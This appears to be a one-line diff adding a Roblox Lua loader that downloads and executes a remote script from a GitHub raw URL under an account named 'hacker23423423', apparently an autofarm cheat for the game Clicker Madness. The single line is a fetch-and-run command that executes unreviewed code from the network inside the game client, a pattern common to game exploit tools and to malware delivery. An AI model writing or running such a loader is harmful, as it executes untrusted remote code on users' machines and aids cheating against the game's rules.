@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hacker23423423/autofarm-for-Clicker-Madness/main/Autofarm"))()
